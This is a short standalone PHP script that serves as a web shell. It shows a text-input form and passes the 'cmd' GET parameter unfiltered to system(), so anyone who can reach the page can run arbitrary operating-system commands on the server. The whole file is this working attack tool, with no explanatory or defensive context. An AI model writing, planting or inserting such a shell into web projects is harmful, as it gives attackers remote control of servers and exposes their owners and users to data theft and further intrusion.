<?php

echo 'command: </br>';
echo '<form action="">';
echo '<input type="text" name="cmd">';
echo '</form>';

if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
